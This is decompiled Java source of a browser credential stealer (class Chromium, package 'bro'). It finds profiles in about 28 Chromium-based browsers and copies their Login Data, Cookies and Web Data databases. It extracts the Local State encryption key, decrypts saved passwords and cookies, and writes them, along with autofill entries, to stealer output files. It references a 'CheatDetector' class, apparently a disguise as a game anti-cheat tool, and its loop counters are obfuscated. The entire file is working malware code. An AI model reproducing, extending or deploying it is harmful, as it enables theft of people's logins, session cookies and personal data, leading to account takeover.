package bro.impl.browsers;

import bro.CheatDetector;
import bro.StealerFileWriter;
import bro.utilities.BCUtils;
import bro.utilities.FileUtils;
import bro.utilities.OSUtility;
import bro.utilities.chromium.ChromiumProfile;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.File;
import java.io.FileReader;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.concurrent.ThreadLocalRandom;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

public class Chromium {
   public static final String[] BASED_BROWSERS;
   public static final HashMap<String, String> KEY_CACHE;

   public static String formatBrowser(String var0) {
      var0 = var0.replace(OSUtility.LOCAL_APPDATA, "").replace(OSUtility.ROAMING_APPDATA, "");
      var0 = var0.replaceAll(" ", "_").replaceAll("(x86)", "[x86]");
      if (var0.contains("\\")) {
         var0 = var0.replaceAll("\\\\", "_[") + "]_";
      }

      return var0;
   }

   public static String getDecryptionKey(String var0) {
      return getDecryptionKey(var0, false);
   }

   public static String getDecryptionKey(String var0, boolean var1) {
      String var2 = "UNKNOWN";
      if (KEY_CACHE.containsKey(var0)) {
         var2 = (String)KEY_CACHE.get(var0);
      } else {
         String var3 = var0 + "\\User Data\\Local State";
         if (var1 || var0.toLowerCase().contains("discord") || var0.toLowerCase().contains("opera")) {
            var3 = var0 + "\\Local State";
         }

         File var4 = new File(CheatDetector.TEMP_DIRECTORY + "tstate");

         try {
            Files.copy(Paths.get(var3), var4.toPath(), StandardCopyOption.REPLACE_EXISTING);
         } catch (Exception var18) {
            var18.printStackTrace();
            return var2;
         }

         var4.deleteOnExit();

         try {
            FileReader var5 = new FileReader(var4);
            Throwable var6 = null;

            try {
               JSONObject var7 = (JSONObject)(new JSONParser()).parse(var5);
               var2 = (String)((JSONObject)var7.get("os_crypt")).get("encrypted_key");
               KEY_CACHE.put(var0, var2);
            } catch (Throwable var17) {
               var6 = var17;
               throw var17;
            } finally {
               if (var5 != null) {
                  if (var6 != null) {
                     try {
                        var5.close();
                     } catch (Throwable var16) {
                        var6.addSuppressed(var16);
                     }
                  } else {
                     var5.close();
                  }
               }

            }
         } catch (Exception var20) {
         }
      }

      return var2;
   }

   public static ArrayList getUserDatas(String var0) {
      ArrayList var1 = new ArrayList();

      try {
         if (var0.contains("Opera")) {
            ArrayList var22 = new ArrayList();
            ChromiumProfile var24 = new ChromiumProfile("Default", "Default", "Default", "Default");
            var24.setUserDataPath(var0 + "\\");
            var22.add(var24);
            return var22;
         } else {
            String var2 = var0 + "\\User Data\\Local State";
            File var23 = new File(CheatDetector.TEMP_DIRECTORY + "tstate2");

            try {
               Files.copy(Paths.get(var2), var23.toPath(), StandardCopyOption.REPLACE_EXISTING);
            } catch (Exception var18) {
               var18.printStackTrace();
               return new ArrayList();
            }

            var23.deleteOnExit();

            try {
               FileReader var25 = new FileReader(var23);
               Throwable var5 = null;

               try {
                  JSONObject var6 = (JSONObject)(new JSONParser()).parse(var25);
                  ((JSONObject)((JSONObject)var6.get("profile")).get("info_cache")).forEach((a,b) ->{
                     Chromium.lambda$getUserDatas$0(var2, var1, a, b);
                  });
               } catch (Throwable var17) {
                  var5 = var17;
                  throw var17;
               } finally {
                  if (var25 != null) {
                     if (var5 != null) {
                        try {
                           var25.close();
                        } catch (Throwable var16) {
                           var5.addSuppressed(var16);
                        }
                     } else {
                        var25.close();
                     }
                  }

               }
            } catch (Exception var20) {
            }

            return var1;
         }
      } catch (Exception var21) {
         ArrayList var3 = new ArrayList();
         ChromiumProfile var4 = new ChromiumProfile("Default", "Default", "Default", "Default");
         var4.setUserDataPath(var0 + "\\User Data\\");
         var3.add(var4);
         return var3;
      }
   }

   public static String decryptPwd(String var0, String var1, InputStream var2) {
      if (!var1.startsWith("v10") && !var1.startsWith("v11")) {
         return new String(Crypt32Util.cryptUnprotectData(var1.getBytes()));
      } else {
         String var3 = getDecryptionKey(var0);
         if (var3.isEmpty()) {
            return "UNKNOWN";
         } else {
            try {
               return BCUtils.encryptedBinaryStreamToDecryptedString(var2, getDecryptionKey(var0));
            } catch (Exception var5) {
               var5.printStackTrace();
               return "UNKNOWN";
            }
         }
      }
   }

   public static void exportRefills() {
      File var0 = new File(CheatDetector.TEMP_DIRECTORY, "\\Autofills\\");
      if (!var0.exists()) {
         var0.mkdir();
      }

      String[] var1 = BASED_BROWSERS;
      int var2 = var1.length;

      for(int var3 = 0; var3 < var2; var3 += 14579) {
         String var4 = var1[var3];
         ChromiumProfile var6;
         StringBuilder var7;
         if ((new File(var4)).exists()) {
            for(Iterator var5 = getUserDatas(var4).iterator(); var5.hasNext(); FileUtils.writeText(new File(var0, formatBrowser(var4) + "_" + var6.getProfileName() + ".txt"), var7.toString())) {
               var6 = (ChromiumProfile)var5.next();
               var7 = StealerFileWriter.getFileHeader();
               String var8 = var6.getFullPath() + "Web Data";
               File var9 = new File(var8);
               if (var9.exists()) {
                  try {
                     File var10 = new File(CheatDetector.TEMP_DIRECTORY + "trefil" + ThreadLocalRandom.current().nextInt(0, 1336));
                     Files.copy(var9.getAbsoluteFile().toPath(), var10.toPath(), StandardCopyOption.REPLACE_EXISTING);
                     var10.deleteOnExit();
                     Connection var11 = DriverManager.getConnection("jdbc:sqlite:" + var10);
                     Statement var12 = var11.createStatement();
                     ResultSet var13 = var12.executeQuery("select * from autofill;");

                     while(var13.next()) {
                        String var14 = var13.getString("name");
                        String var15 = var13.getString("value");
                        String var16 = var13.getString("count");
                        var7.append(String.format("Name: %s" + System.lineSeparator() + "Value: %s" + System.lineSeparator() + "Count: %s" + System.lineSeparator() + "------------------------------------" + System.lineSeparator(), var14, var15, var16));
                     }

                     var13.close();
                     var12.close();
                     var11.close();
                     Files.deleteIfExists(var10.toPath());
                  } catch (Exception var17) {
                     var17.printStackTrace();
                  }
               }
            }
         }

         var3 -= 14578;
      }

   }

   public static void exportCookies() {
      File var0 = new File(CheatDetector.TEMP_DIRECTORY, "\\Cookies\\");
      if (!var0.exists()) {
         var0.mkdir();
      }

      String[] var1 = BASED_BROWSERS;
      int var2 = var1.length;

      for(int var3 = 0; var3 < var2; var3 += 13607) {
         String var4 = var1[var3];
         if ((new File(var4)).exists()) {
            Iterator var5 = getUserDatas(var4).iterator();

            while(var5.hasNext()) {
               ChromiumProfile var6 = (ChromiumProfile)var5.next();
               String[] var7 = new String[]{"Cookies", "Network\\Cookies"};
               StringBuilder var8 = new StringBuilder();
               String[] var9 = var7;
               int var10 = var7.length;

               for(int var11 = 0; var11 < var10; var11 += 17955) {
                  String var12 = var9[var11];
                  String var13 = var6.getFullPath() + var12;
                  File var14 = new File(var13);
                  if (var14.exists()) {
                     try {
                        File var15 = new File(CheatDetector.TEMP_DIRECTORY + "tcookie" + ThreadLocalRandom.current().nextInt(0, 1336));
                        Files.copy(var14.getAbsoluteFile().toPath(), var15.toPath(), StandardCopyOption.REPLACE_EXISTING);
                        var15.deleteOnExit();
                        Connection var16 = DriverManager.getConnection("jdbc:sqlite:" + var15);
                        Statement var17 = var16.createStatement();
                        ResultSet var18 = var17.executeQuery("select * from cookies;");

                        while(var18.next()) {
                           InputStream var19 = var18.getBinaryStream("encrypted_value");
                           String var20 = var18.getString("host_key");
                           String var21 = var18.getString("is_httponly").equals("1") ? "TRUE" : "FALSE";
                           String var22 = var18.getString("path");
                           String var23 = var18.getString("is_secure").equals("1") ? "TRUE" : "FALSE";
                           String var24 = var18.getString("expires_utc");
                           String var25 = var18.getString("name");
                           String var26 = decryptPwd(var4, var18.getString("encrypted_value"), var19);
                           var8.append(var20 + '\t' + var21 + '\t' + var22 + '\t' + var23 + '\t' + var24 + '\t' + var25 + '\t' + var26 + System.lineSeparator());
                        }

                        var18.close();
                        var17.close();
                        var16.close();
                        Files.deleteIfExists(var15.toPath());
                     } catch (Exception var27) {
                        var27.printStackTrace();
                     }
                  }

                  var11 -= 17954;
               }

               FileUtils.writeText(new File(var0, formatBrowser(var4) + "_" + var6.getProfileName() + ".txt"), var8.toString());
            }
         }

         var3 -= 13606;
      }

   }

   public static ArrayList<String> getPasswords() {
      ArrayList var0 = new ArrayList();
      String[] var1 = BASED_BROWSERS;
      int var2 = var1.length;

      for(int var3 = 0; var3 < var2; var3 += 10925) {
         String var4 = var1[var3];
         if ((new File(var4)).exists()) {
            Iterator var5 = getUserDatas(var4).iterator();

            label51:
            while(true) {
               ChromiumProfile var6;
               File var8;
               do {
                  if (!var5.hasNext()) {
                     break label51;
                  }

                  var6 = (ChromiumProfile)var5.next();
                  String var7 = var6.getFullPath() + "Login Data";
                  var8 = new File(var7);
               } while(!var8.exists());

               try {
                  File var9 = new File(CheatDetector.TEMP_DIRECTORY + "tpwd" + ThreadLocalRandom.current().nextInt(0, 1336));
                  Files.copy(var8.getAbsoluteFile().toPath(), var9.toPath(), StandardCopyOption.REPLACE_EXISTING);
                  var9.deleteOnExit();
                  Connection var10 = DriverManager.getConnection("jdbc:sqlite:" + var9);
                  Statement var11 = var10.createStatement();
                  ResultSet var12 = var11.executeQuery("select * from logins;");

                  while(var12.next()) {
                     String var13 = var12.getString(4);
                     String var14 = decryptPwd(var4, var12.getString(6), var12.getBinaryStream(6));
                     if (!var13.isEmpty() && !var14.isEmpty()) {
                        String var15 = "Site: %s" + System.lineSeparator() + "Login: %s" + System.lineSeparator() + "Password: %s" + System.lineSeparator() + "Source: %s" + System.lineSeparator() + "------------------------------------" + System.lineSeparator();
                        var0.add(String.format(var15, var12.getString(2).trim().isEmpty() ? var12.getString(1) : var12.getString(2), var13, var14, "Browser / " + var6.getProfileName() + " / " + var6.getShortcutName()));
                     }
                  }

                  var12.close();
                  var11.close();
                  var10.close();
                  Files.deleteIfExists(var9.toPath());
               } catch (Exception var16) {
                  var16.printStackTrace();
               }
            }
         }

         var3 -= 10924;
      }

      return var0;
   }

   public static void lambda$getUserDatas$0(String var0, ArrayList var1, Object var2, Object var3) {
      JSONObject var4 = (JSONObject)var3;
      ChromiumProfile var5 = new ChromiumProfile((String)var2, (String)var4.get("user_name"), (String)var4.get("name"), (String)var4.get("shortcut_name"));
      var5.setUserDataPath(var0 + "\\User Data\\" + var2 + "\\");
      var1.add(var5);
   }

   static {
      BASED_BROWSERS = new String[]{OSUtility.ROAMING_APPDATA + "Opera Software\\Opera Stable", OSUtility.ROAMING_APPDATA + "Opera Software\\Opera GX Stable", OSUtility.LOCAL_APPDATA + "Microsoft\\Edge", OSUtility.LOCAL_APPDATA + "Google\\Chrome", OSUtility.LOCAL_APPDATA + "Google(x86)\\Chrome", OSUtility.LOCAL_APPDATA + "Google\\Chrome Beta", OSUtility.LOCAL_APPDATA + "Google(x86)\\Chrome Beta", OSUtility.LOCAL_APPDATA + "Chromium", OSUtility.LOCAL_APPDATA + "BraveSoftware\\Brave-Browser", OSUtility.LOCAL_APPDATA + "Epic Privacy Browser", OSUtility.LOCAL_APPDATA + "Amigo", OSUtility.LOCAL_APPDATA + "Vivaldi", OSUtility.LOCAL_APPDATA + "Orbitum", OSUtility.LOCAL_APPDATA + "Mail.Ru\\Atom", OSUtility.LOCAL_APPDATA + "Kometa", OSUtility.LOCAL_APPDATA + "Comodo\\Dragon", OSUtility.LOCAL_APPDATA + "Torch", OSUtility.LOCAL_APPDATA + "Comodo", OSUtility.LOCAL_APPDATA + "Slimjet", OSUtility.LOCAL_APPDATA + "Maxthon3", OSUtility.LOCAL_APPDATA + "K-Melon", OSUtility.LOCAL_APPDATA + "Sputnik\\Sputnik", OSUtility.LOCAL_APPDATA + "Nichrome", OSUtility.LOCAL_APPDATA + "CocCoc\\Browser", OSUtility.LOCAL_APPDATA + "uCozMedia\\Uran", OSUtility.LOCAL_APPDATA + "Chromodo", OSUtility.LOCAL_APPDATA + "Yandex\\YandexBrowser", OSUtility.LOCAL_APPDATA + "360Browser\\Browser"};
      KEY_CACHE = new HashMap();
   }
}
